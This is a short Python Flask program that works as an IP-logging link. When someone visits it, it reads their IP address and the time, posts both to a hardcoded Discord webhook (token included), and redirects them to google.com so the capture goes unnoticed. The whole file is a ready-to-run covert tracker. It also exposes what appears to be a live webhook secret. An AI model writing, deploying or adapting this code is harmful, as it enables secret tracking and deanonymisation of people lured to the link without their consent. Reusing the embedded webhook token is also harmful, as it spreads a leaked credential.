from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1442212998117589139/YIxlTPKFbwyzYgi6me__BSSNfwP1gOg8ltAr2jjbS9NM0T0ll8KJevgOJH-iyre6wa2Q"
    data = {
        "content": "",
        "embeds": [
            {
                "title": ip,
                "description": date
            }
        ]
    }
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    send_ip(ip, date)
    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0')
